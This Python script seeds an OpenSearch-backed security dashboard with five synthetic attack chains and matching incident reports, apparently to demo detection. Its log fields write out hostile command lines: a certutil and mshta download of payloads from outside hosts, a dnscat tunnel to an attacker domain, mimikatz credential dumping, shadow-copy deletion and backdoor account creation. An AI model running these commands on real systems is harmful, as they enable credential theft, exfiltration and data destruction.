"""
inject_demo_data.py  (v2 – rich multi-hop attack chains)
Injects 5 synthetic attack scenarios into OpenSearch.
Each scenario has multiple related log entries that build a meaningful multi-hop
provenance graph:  parent-process → child-process → network/file targets.

Run: python inject_demo_data.py
"""

import os
from datetime import datetime, timezone, timedelta
from opensearchpy import OpenSearch, helpers
from dotenv import load_dotenv

load_dotenv()

HOST = os.getenv("OPENSEARCH_HOST", "localhost")
PORT = int(os.getenv("OPENSEARCH_PORT", "9200"))

client = OpenSearch(
    hosts=[{"host": HOST, "port": PORT}],
    http_compress=True, use_ssl=False, verify_certs=False,
    ssl_assert_hostname=False, ssl_show_warn=False,
)

def ts(offset_seconds: float = 0) -> str:
    return (datetime.now(timezone.utc) - timedelta(seconds=offset_seconds)).strftime(
        "%Y-%m-%dT%H:%M:%S.000000Z"
    )

def ts_slice(offset_minutes: int = 0) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=offset_minutes)).strftime(
        "%Y-%m-%dT%H:%M"
    )

# ---------------------------------------------------------------------------
# Multi-hop attack chain log templates
# Each entry represents one event in the attack chain.
# Fields are picked up by graph_builder._add_log_to_graph:
#   src  <- process.name / Image / src_ip
#   dst  <- file.path / TargetFilename / dst_ip / target.process.name
#   action <- event.action / action / EventID / Protocol Type
# ---------------------------------------------------------------------------

SCENARIOS = []

# ─────────────────────────────────────────────────────────────────────────────
# 1. SMB LATERAL MOVEMENT (PsExec-style)
# ─────────────────────────────────────────────────────────────────────────────
smb_ts = ts_slice(5)
smb_gid = f"10.10.1.55_10.10.1.200_445_TCP_{smb_ts}"
SCENARIOS.append({
    "group_id": smb_gid,
    "logs": [
        # cmd.exe spawns psexec
        {"@timestamp": ts(320), "sentinel_group_id": smb_gid,
         "process.name": "cmd.exe", "Image": "C:\\Windows\\System32\\cmd.exe",
         "target.process.name": "psexec.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "psexec.exe \\\\10.10.1.200 -u CORP\\\\admin -p P@ssw0rd! cmd",
         "user.name": "CORP\\attacker", "process.pid": 4821,
         "process.parent.name": "explorer.exe", "IntegrityLevel": "High"},
        # psexec drops a service binary
        {"@timestamp": ts(310), "sentinel_group_id": smb_gid,
         "process.name": "psexec.exe", "Image": "C:\\Windows\\Temp\\psexec.exe",
         "file.path": "C:\\Windows\\System32\\PSEXESVC.exe",
         "TargetFilename": "C:\\Windows\\System32\\PSEXESVC.exe",
         "event.action": "file_write", "EventID": "11",
         "user.name": "CORP\\attacker", "process.pid": 5102,
         "process.parent.name": "cmd.exe"},
        # psexec network connection to SMB
        {"@timestamp": ts(305), "sentinel_group_id": smb_gid,
         "process.name": "psexec.exe",
         "src_ip": "10.10.1.55", "dst_ip": "10.10.1.200",
         "dst_port": 445, "protocol": "TCP",
         "bytes_sent": 98304, "bytes_received": 204800,
         "event.action": "network_connect", "EventID": "3",
         "user.name": "CORP\\attacker"},
        # Remote shell spawned on DC
        {"@timestamp": ts(295), "sentinel_group_id": smb_gid,
         "process.name": "PSEXESVC.exe", "Image": "C:\\Windows\\System32\\PSEXESVC.exe",
         "target.process.name": "cmd.exe",
         "event.action": "process_create", "EventID": "4688",
         "user.name": "NT AUTHORITY\\SYSTEM", "process.pid": 1204,
         "process.parent.name": "services.exe", "IntegrityLevel": "System"},
        # Credential dumping via lsass access
        {"@timestamp": ts(285), "sentinel_group_id": smb_gid,
         "process.name": "cmd.exe", "Image": "C:\\Windows\\System32\\cmd.exe",
         "target.process.name": "lsass.exe",
         "event.action": "process_access", "EventID": "10",
         "CommandLine": "rundll32.exe C:\\Windows\\Temp\\dumper.dll,Main",
         "user.name": "NT AUTHORITY\\SYSTEM", "process.pid": 1204,
         "process.parent.name": "PSEXESVC.exe"},
        # Dump written to disk
        {"@timestamp": ts(275), "sentinel_group_id": smb_gid,
         "process.name": "rundll32.exe",
         "file.path": "C:\\Windows\\Temp\\lsass.dmp",
         "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp",
         "event.action": "file_write", "EventID": "11",
         "user.name": "NT AUTHORITY\\SYSTEM", "process.pid": 5810,
         "process.parent.name": "cmd.exe"},
    ],
    "incident": {
        "incident_title": "[Lateral Movement] SMB PsExec with LSASS Credential Dump on Domain Controller",
        "severity": "Critical", "confidence_score": 0.97,
        "risk_justification": "PsExec used to gain SYSTEM shell on DC; lsass.exe memory dumped for credential harvesting.",
        "summary": "Attacker used PsExec to establish a SYSTEM-level remote shell on domain controller 10.10.1.200 via SMB/445. A service binary (PSEXESVC.exe) was written to System32 and a credential dump of lsass.exe was performed and staged at C:\\Windows\\Temp\\lsass.dmp.",
        "impact_assessment": {"confidentiality": "High", "integrity": "High", "availability": "Medium", "blast_radius": "Domain-Wide", "technical_description": "Complete domain credential compromise. All Active Directory accounts should be treated as compromised."},
        "mitre_mappings": [
            {"tactic": "Lateral Movement", "technique_id": "T1021.002", "technique_name": "SMB/Windows Admin Shares"},
            {"tactic": "Credential Access", "technique_id": "T1003.001", "technique_name": "LSASS Memory"},
            {"tactic": "Execution", "technique_id": "T1569.002", "technique_name": "Service Execution"},
        ],
        "observables": [
            {"type": "ipv4-addr", "value": "10.10.1.55", "description": "Attacker pivot host"},
            {"type": "ipv4-addr", "value": "10.10.1.200", "description": "Target domain controller"},
            {"type": "file-path", "value": "C:\\Windows\\Temp\\lsass.dmp", "description": "LSASS credential dump file"},
            {"type": "process", "value": "PSEXESVC.exe", "description": "Remote execution service binary"},
        ],
        "remediation_steps": [
            "Isolate 10.10.1.55 immediately and kill all active sessions on DC",
            "Delete C:\\Windows\\Temp\\lsass.dmp and PSEXESVC.exe",
            "Reset KRBTGT password twice; reset all domain admin credentials",
            "Enable Credential Guard on all DCs to prevent future LSASS dumping",
        ],
    },
})

# ─────────────────────────────────────────────────────────────────────────────
# 2. DNS EXFILTRATION (dnscat2-style)
# ─────────────────────────────────────────────────────────────────────────────
dns_ts = ts_slice(12)
dns_gid = f"192.168.5.12_8.8.8.8_53_UDP_{dns_ts}"
SCENARIOS.append({
    "group_id": dns_gid,
    "logs": [
        # Malicious macro drops dnscat
        {"@timestamp": ts(800), "sentinel_group_id": dns_gid,
         "process.name": "WINWORD.EXE", "Image": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
         "target.process.name": "powershell.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "powershell.exe -NoP -Enc JABzAD0ATgBlAHcA...",
         "user.name": "CORP\\jdoe", "process.pid": 3322,
         "process.parent.name": "explorer.exe", "IntegrityLevel": "Medium"},
        # PowerShell writes the dnscat binary
        {"@timestamp": ts(790), "sentinel_group_id": dns_gid,
         "process.name": "powershell.exe",
         "file.path": "C:\\Users\\jdoe\\AppData\\Roaming\\dnscat.exe",
         "TargetFilename": "C:\\Users\\jdoe\\AppData\\Roaming\\dnscat.exe",
         "event.action": "file_write", "EventID": "11",
         "user.name": "CORP\\jdoe", "process.pid": 7744,
         "process.parent.name": "WINWORD.EXE"},
        # dnscat persistence via registry
        {"@timestamp": ts(785), "sentinel_group_id": dns_gid,
         "process.name": "powershell.exe",
         "file.path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SvcHost32",
         "TargetFilename": "HKCU\\Run\\SvcHost32",
         "event.action": "registry_set", "EventID": "13",
         "user.name": "CORP\\jdoe"},
        # dnscat spawned
        {"@timestamp": ts(780), "sentinel_group_id": dns_gid,
         "process.name": "powershell.exe",
         "target.process.name": "dnscat.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "dnscat.exe --dns server=8.8.8.8,port=53 --secret=supersecret tunnel.attacker.com",
         "user.name": "CORP\\jdoe", "process.pid": 9201,
         "process.parent.name": "powershell.exe"},
        # DNS exfil traffic
        {"@timestamp": ts(770), "sentinel_group_id": dns_gid,
         "process.name": "dnscat.exe",
         "src_ip": "192.168.5.12", "dst_ip": "8.8.8.8", "dst_port": 53,
         "protocol": "UDP", "bytes_sent": 512000, "bytes_received": 2048,
         "event.action": "dns_query", "EventID": "22",
         "user.name": "CORP\\jdoe", "process.pid": 9201},
        # Data staged before exfil
        {"@timestamp": ts(810), "sentinel_group_id": dns_gid,
         "process.name": "powershell.exe",
         "file.path": "C:\\Users\\jdoe\\AppData\\Roaming\\staged_data.zip",
         "TargetFilename": "C:\\Users\\jdoe\\AppData\\Roaming\\staged_data.zip",
         "event.action": "file_write", "EventID": "11",
         "CommandLine": "Compress-Archive -Path C:\\Users\\jdoe\\Documents\\* -DestinationPath staged_data.zip",
         "user.name": "CORP\\jdoe"},
    ],
    "incident": {
        "incident_title": "[Exfiltration] Malicious Word Macro → DNSCat2 Tunnel to External Resolver",
        "severity": "High", "confidence_score": 0.92,
        "risk_justification": "Office macro spawned PowerShell which dropped and executed dnscat2; 512KB exfiltrated via DNS tunneling to 8.8.8.8.",
        "summary": "A weaponized Word document triggered a macro that launched an encoded PowerShell command. PowerShell staged user documents into a ZIP, dropped dnscat.exe, and established a DNS tunnel over UDP/53 to an external resolver for data exfiltration.",
        "impact_assessment": {"confidentiality": "High", "integrity": "Low", "availability": "None", "blast_radius": "Single Host", "technical_description": "Documents from jdoe's profile were archived and exfiltrated via DNS. Registry Run key persistence was established for persistence across reboots."},
        "mitre_mappings": [
            {"tactic": "Initial Access", "technique_id": "T1566.001", "technique_name": "Spearphishing Attachment"},
            {"tactic": "Exfiltration", "technique_id": "T1048.003", "technique_name": "Exfiltration Over DNS"},
            {"tactic": "Persistence", "technique_id": "T1547.001", "technique_name": "Registry Run Keys"},
        ],
        "observables": [
            {"type": "ipv4-addr", "value": "192.168.5.12", "description": "Infected workstation"},
            {"type": "file-path", "value": "C:\\Users\\jdoe\\AppData\\Roaming\\dnscat.exe", "description": "DNSCat2 binary"},
            {"type": "file-path", "value": "C:\\Users\\jdoe\\AppData\\Roaming\\staged_data.zip", "description": "Exfiltrated data archive"},
            {"type": "process", "value": "WINWORD.EXE", "description": "Weaponized Office document vector"},
        ],
        "remediation_steps": [
            "Kill dnscat.exe and remove from AppData\\Roaming",
            "Delete HKCU Run registry key SvcHost32",
            "Block all direct outbound DNS; route through internal resolver",
            "Investigate C:\\Users\\jdoe\\Documents for data that may have been stolen",
        ],
    },
})

# ─────────────────────────────────────────────────────────────────────────────
# 3. COBALT STRIKE C2 BEACON
# ─────────────────────────────────────────────────────────────────────────────
c2_ts = ts_slice(20)
c2_gid = f"10.20.0.33_185.220.101.47_443_TCP_{c2_ts}"
SCENARIOS.append({
    "group_id": c2_gid,
    "logs": [
        # Exploit delivers shellcode via mshta
        {"@timestamp": ts(1300), "sentinel_group_id": c2_gid,
         "process.name": "chrome.exe", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
         "target.process.name": "mshta.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "mshta.exe http://malicious.c2.info/payload.hta",
         "user.name": "CORP\\msmith", "process.pid": 6641,
         "process.parent.name": "explorer.exe"},
        # mshta injects shellcode into svchost
        {"@timestamp": ts(1290), "sentinel_group_id": c2_gid,
         "process.name": "mshta.exe",
         "target.process.name": "svchost.exe",
         "event.action": "process_inject", "EventID": "8",
         "CommandLine": "VirtualAllocEx → WriteProcessMemory → CreateRemoteThread",
         "user.name": "CORP\\msmith", "process.pid": 8831,
         "process.parent.name": "chrome.exe"},
        # svchost beacons to C2
        {"@timestamp": ts(1280), "sentinel_group_id": c2_gid,
         "process.name": "svchost.exe",
         "src_ip": "10.20.0.33", "dst_ip": "185.220.101.47",
         "dst_port": 443, "protocol": "TCP",
         "bytes_sent": 4096, "bytes_received": 1024,
         "event.action": "network_connect", "EventID": "3",
         "user.name": "NT AUTHORITY\\SYSTEM"},
        # Beacon downloads and runs Mimikatz
        {"@timestamp": ts(1250), "sentinel_group_id": c2_gid,
         "process.name": "svchost.exe",
         "target.process.name": "mimikatz.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
         "user.name": "NT AUTHORITY\\SYSTEM", "process.pid": 2048,
         "process.parent.name": "svchost.exe"},
        # mimikatz touches lsass
        {"@timestamp": ts(1245), "sentinel_group_id": c2_gid,
         "process.name": "mimikatz.exe",
         "target.process.name": "lsass.exe",
         "event.action": "process_access", "EventID": "10",
         "user.name": "NT AUTHORITY\\SYSTEM", "process.pid": 2048},
        # WMI lateral movement command
        {"@timestamp": ts(1210), "sentinel_group_id": c2_gid,
         "process.name": "svchost.exe",
         "target.process.name": "WmiPrvSE.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "wmic /node:10.20.0.50 process call create \"calc.exe\"",
         "user.name": "NT AUTHORITY\\SYSTEM", "process.pid": 2048,
         "process.parent.name": "svchost.exe"},
        # Second C2 beacon (persistence check-in)
        {"@timestamp": ts(1180), "sentinel_group_id": c2_gid,
         "process.name": "svchost.exe",
         "src_ip": "10.20.0.33", "dst_ip": "185.220.101.47",
         "dst_port": 443, "protocol": "TCP",
         "bytes_sent": 512, "bytes_received": 8192,
         "event.action": "network_connect", "EventID": "3"},
    ],
    "incident": {
        "incident_title": "[C2] Cobalt Strike Beacon via mshta.exe Process Injection → Mimikatz → WMI Lateral Movement",
        "severity": "Critical", "confidence_score": 0.98,
        "risk_justification": "Chrome spawned mshta.exe which injected into svchost for process hollowing; beacon to known Tor C2 IP, Mimikatz executed, WMI lateral movement confirmed.",
        "summary": "A drive-by compromise via Chrome delivered a malicious HTA file through mshta.exe. Shellcode was injected into svchost.exe using classic VirtualAllocEx/CreateRemoteThread. The implant beaconed to a known Cobalt Strike C2 server (Tor exit node 185.220.101.47), downloaded Mimikatz, and performed WMI lateral movement to 10.20.0.50.",
        "impact_assessment": {"confidentiality": "High", "integrity": "High", "availability": "High", "blast_radius": "Domain-Wide", "technical_description": "Active Cobalt Strike implant with domain credential access and WMI propagation capability — full domain compromise imminent."},
        "mitre_mappings": [
            {"tactic": "Initial Access", "technique_id": "T1189", "technique_name": "Drive-by Compromise"},
            {"tactic": "Defense Evasion", "technique_id": "T1055", "technique_name": "Process Injection"},
            {"tactic": "Credential Access", "technique_id": "T1003.001", "technique_name": "LSASS Memory (Mimikatz)"},
            {"tactic": "Lateral Movement", "technique_id": "T1047", "technique_name": "WMI Execution"},
        ],
        "observables": [
            {"type": "ipv4-addr", "value": "185.220.101.47", "description": "Cobalt Strike C2 / Tor exit node"},
            {"type": "process", "value": "mimikatz.exe", "description": "Credential harvesting tool"},
            {"type": "process", "value": "mshta.exe", "description": "HTA delivery vector"},
            {"type": "process", "value": "svchost.exe", "description": "Injected Cobalt Strike beacon carrier"},
        ],
        "remediation_steps": [
            "Isolate 10.20.0.33 and 10.20.0.50 immediately",
            "Kill svchost.exe PIDs with unexpected parent processes",
            "Block 185.220.101.47 at perimeter; add Tor exit node blocklist",
            "Reset all credentials visible in LSASS — treat all domain accounts as compromised",
        ],
    },
})

# ─────────────────────────────────────────────────────────────────────────────
# 4. RANSOMWARE DEPLOYMENT
# ─────────────────────────────────────────────────────────────────────────────
rans_ts = ts_slice(35)
rans_gid = f"10.30.0.7_10.30.0.1_445_TCP_{rans_ts}"
SCENARIOS.append({
    "group_id": rans_gid,
    "logs": [
        # Phishing email opens macro
        {"@timestamp": ts(2200), "sentinel_group_id": rans_gid,
         "process.name": "OUTLOOK.EXE", "Image": "C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE",
         "target.process.name": "WINWORD.EXE",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "WINWORD.EXE invoice_nov2025.docm",
         "user.name": "CORP\\bwilson", "process.pid": 4411,
         "process.parent.name": "explorer.exe"},
        # Word macro runs certutil to download ransomware
        {"@timestamp": ts(2190), "sentinel_group_id": rans_gid,
         "process.name": "WINWORD.EXE",
         "target.process.name": "certutil.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "certutil.exe -urlcache -split -f http://185.33.87.1/r.exe C:\\ProgramData\\r.exe",
         "user.name": "CORP\\bwilson", "process.pid": 5512,
         "process.parent.name": "WINWORD.EXE"},
        # Ransomware binary downloaded
        {"@timestamp": ts(2185), "sentinel_group_id": rans_gid,
         "process.name": "certutil.exe",
         "file.path": "C:\\ProgramData\\r.exe",
         "TargetFilename": "C:\\ProgramData\\r.exe",
         "event.action": "file_write", "EventID": "11",
         "user.name": "CORP\\bwilson"},
        # SMB share enumeration before encryption
        {"@timestamp": ts(2170), "sentinel_group_id": rans_gid,
         "process.name": "r.exe",
         "src_ip": "10.30.0.7", "dst_ip": "10.30.0.1",
         "dst_port": 445, "protocol": "TCP",
         "bytes_sent": 65536, "bytes_received": 131072,
         "event.action": "network_connect", "EventID": "3",
         "CommandLine": "net view /all", "user.name": "CORP\\bwilson"},
        # Shadow copy deletion
        {"@timestamp": ts(2160), "sentinel_group_id": rans_gid,
         "process.name": "r.exe",
         "target.process.name": "vssadmin.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "vssadmin.exe delete shadows /all /quiet",
         "user.name": "CORP\\bwilson", "process.pid": 7700,
         "process.parent.name": "r.exe"},
        # Mass file encryption
        {"@timestamp": ts(2150), "sentinel_group_id": rans_gid,
         "process.name": "r.exe",
         "file.path": "C:\\Users\\bwilson\\Documents\\report.docx.LOCKED",
         "TargetFilename": "C:\\Users\\bwilson\\Documents\\report.docx.LOCKED",
         "event.action": "file_rename", "EventID": "11",
         "user.name": "CORP\\bwilson", "process.pid": 7700},
        # Ransom note written
        {"@timestamp": ts(2140), "sentinel_group_id": rans_gid,
         "process.name": "r.exe",
         "file.path": "C:\\Users\\bwilson\\Desktop\\README_DECRYPT.txt",
         "TargetFilename": "C:\\Users\\bwilson\\Desktop\\README_DECRYPT.txt",
         "event.action": "file_write", "EventID": "11",
         "user.name": "CORP\\bwilson"},
    ],
    "incident": {
        "incident_title": "[Impact] LockBit-style Ransomware Deployment via Phishing Macro → certutil Download",
        "severity": "Critical", "confidence_score": 0.99,
        "risk_justification": "Full ransomware chain: phishing → macro → certutil download → shadow deletion → file encryption. Ransom note confirmed.",
        "summary": "A phishing email with a malicious Word macro (invoice_nov2025.docm) caused certutil.exe to download a ransomware binary to C:\\ProgramData\\r.exe. The payload deleted Volume Shadow Copies, enumerated SMB shares, encrypted user files (appending .LOCKED extension), and dropped a ransom note on the Desktop.",
        "impact_assessment": {"confidentiality": "High", "integrity": "High", "availability": "High", "blast_radius": "Domain-Wide", "technical_description": "Ransomware with network propagation capability — SMB share enumeration indicates active spread attempt. All backups targeted via VSS deletion."},
        "mitre_mappings": [
            {"tactic": "Initial Access", "technique_id": "T1566.001", "technique_name": "Phishing: Malicious Attachment"},
            {"tactic": "Defense Evasion", "technique_id": "T1490", "technique_name": "Inhibit System Recovery (VSS Delete)"},
            {"tactic": "Impact", "technique_id": "T1486", "technique_name": "Data Encrypted for Impact"},
            {"tactic": "Ingress Tool Transfer", "technique_id": "T1105", "technique_name": "certutil download"},
        ],
        "observables": [
            {"type": "file-path", "value": "C:\\ProgramData\\r.exe", "description": "Ransomware binary"},
            {"type": "file-path", "value": "C:\\Users\\bwilson\\Desktop\\README_DECRYPT.txt", "description": "Ransom note"},
            {"type": "ipv4-addr", "value": "185.33.87.1", "description": "Ransomware C2 / download server"},
            {"type": "process", "value": "certutil.exe", "description": "LOLBin used for malware download"},
        ],
        "remediation_steps": [
            "Immediately isolate 10.30.0.7 from all network segments",
            "DO NOT reboot — preserve memory image for forensic analysis",
            "Restore files from offline backups (VSS copies are deleted)",
            "Initiate BCP (Business Continuity Plan) for affected business units",
            "Block certutil.exe network access via AppLocker/Windows Defender ASR rules",
        ],
    },
})

# ─────────────────────────────────────────────────────────────────────────────
# 5. PRIVILEGE ESCALATION (PrintNightmare-style)
# ─────────────────────────────────────────────────────────────────────────────
priv_ts = ts_slice(50)
priv_gid = f"10.40.0.22_10.40.0.1_445_TCP_{priv_ts}"
SCENARIOS.append({
    "group_id": priv_gid,
    "logs": [
        # Low-privilege user spawns exploit
        {"@timestamp": ts(3100), "sentinel_group_id": priv_gid,
         "process.name": "powershell.exe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "target.process.name": "spoolsv.exe",
         "event.action": "process_inject", "EventID": "8",
         "CommandLine": "Invoke-Nightmare -NewUser hacker -NewPassword P@ss123",
         "user.name": "CORP\\lowpriv", "process.pid": 6699,
         "process.parent.name": "cmd.exe", "IntegrityLevel": "Medium"},
        # Spooler loads malicious DLL
        {"@timestamp": ts(3090), "sentinel_group_id": priv_gid,
         "process.name": "spoolsv.exe",
         "file.path": "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\nightmare.dll",
         "TargetFilename": "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\nightmare.dll",
         "event.action": "file_write", "EventID": "11",
         "user.name": "NT AUTHORITY\\SYSTEM"},
        # New admin user created
        {"@timestamp": ts(3080), "sentinel_group_id": priv_gid,
         "process.name": "spoolsv.exe",
         "target.process.name": "net.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "net user hacker P@ss123 /add && net localgroup Administrators hacker /add",
         "user.name": "NT AUTHORITY\\SYSTEM", "process.pid": 1100,
         "process.parent.name": "spoolsv.exe"},
        # SMB connection with new admin credentials
        {"@timestamp": ts(3070), "sentinel_group_id": priv_gid,
         "process.name": "net.exe",
         "src_ip": "10.40.0.22", "dst_ip": "10.40.0.1",
         "dst_port": 445, "protocol": "TCP",
         "bytes_sent": 12288, "bytes_received": 4096,
         "event.action": "network_connect", "EventID": "3",
         "user.name": "hacker"},
        # Remote command execution with new account
        {"@timestamp": ts(3060), "sentinel_group_id": priv_gid,
         "process.name": "svchost.exe",
         "target.process.name": "cmd.exe",
         "event.action": "process_create", "EventID": "4688",
         "CommandLine": "cmd.exe /c whoami && ipconfig /all > C:\\Temp\\recon.txt",
         "user.name": "hacker", "process.pid": 9900,
         "process.parent.name": "svchost.exe", "IntegrityLevel": "High"},
        # Recon data saved
        {"@timestamp": ts(3055), "sentinel_group_id": priv_gid,
         "process.name": "cmd.exe",
         "file.path": "C:\\Temp\\recon.txt",
         "TargetFilename": "C:\\Temp\\recon.txt",
         "event.action": "file_write", "EventID": "11",
         "user.name": "hacker"},
    ],
    "incident": {
        "incident_title": "[Privilege Escalation] PrintNightmare Exploit → Local Admin Account Creation → SMB Access",
        "severity": "High", "confidence_score": 0.94,
        "risk_justification": "Invoke-Nightmare used PrintNightmare (CVE-2021-34527) to inject into spoolsv.exe as SYSTEM and create a backdoor admin account 'hacker'.",
        "summary": "Low-privileged user CORP\\lowpriv exploited PrintNightmare (CVE-2021-34527) via a PowerShell script (Invoke-Nightmare). The Windows Print Spooler loaded a malicious DLL running as SYSTEM, which created a new local admin account 'hacker'. The account was then used for SMB access to the domain controller and post-exploitation reconnaissance.",
        "impact_assessment": {"confidentiality": "Medium", "integrity": "High", "availability": "Low", "blast_radius": "Subnet", "technical_description": "Backdoor admin account created on privileged system; used for SMB access to DC. If domain admin credentials cached, escalation to DA is likely."},
        "mitre_mappings": [
            {"tactic": "Privilege Escalation", "technique_id": "T1068", "technique_name": "Exploitation for Privilege Escalation (CVE-2021-34527)"},
            {"tactic": "Persistence", "technique_id": "T1136.001", "technique_name": "Create Local Account"},
            {"tactic": "Discovery", "technique_id": "T1082", "technique_name": "System Information Discovery"},
        ],
        "observables": [
            {"type": "ipv4-addr", "value": "10.40.0.22", "description": "Attacker workstation"},
            {"type": "user-account", "value": "hacker", "description": "Backdoor admin account created via PrintNightmare"},
            {"type": "file-path", "value": "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\nightmare.dll", "description": "PrintNightmare malicious DLL"},
            {"type": "process", "value": "spoolsv.exe", "description": "Exploited Windows Print Spooler process"},
        ],
        "remediation_steps": [
            "Delete backdoor account 'hacker' immediately",
            "Remove nightmare.dll from spool drivers directory",
            "Apply Microsoft patch KB5005010 for PrintNightmare on all hosts",
            "Disable Print Spooler service on all DCs if printing is not required (recommended)",
        ],
    },
})

# ---------------------------------------------------------------------------
# Inject everything
# ---------------------------------------------------------------------------
log_actions = []
incident_actions = []

for s in SCENARIOS:
    for log in s["logs"]:
        log_actions.append({"_index": "logs-sentinel", "_source": log})
    incident_doc = {"@timestamp": ts(0), "graph_id": s["group_id"], **s["incident"]}
    incident_actions.append({"_index": "sentinel-incidents", "_id": s["group_id"], "_source": incident_doc})

print(f"Injecting {len(log_actions)} rich attack-chain log documents...")
ok, errors = helpers.bulk(client, log_actions, raise_on_error=False)
print(f"  ✓ Logs: {ok} indexed, {len(errors)} errors")

print(f"Injecting {len(incident_actions)} incident reports...")
ok, errors = helpers.bulk(client, incident_actions, raise_on_error=False)
print(f"  ✓ Incidents: {ok} indexed, {len(errors)} errors")

print("\nDone! Summary of injected attack chains:")
for s in SCENARIOS:
    name = s["incident"]["incident_title"].split("]")[0].lstrip("[")
    print(f"  • {name}: {len(s['logs'])} logs  →  ID: {s['group_id']}")

print("\nIn Streamlit:")
print("  Tab 1 → Incident Feed: 5 DFIR reports with full MITRE/CIA/Remediation")
print("  Tab 2 → Graph Visualizer: toggle 'Meaningful Information Only' ON → select ID → Generate Graph View")
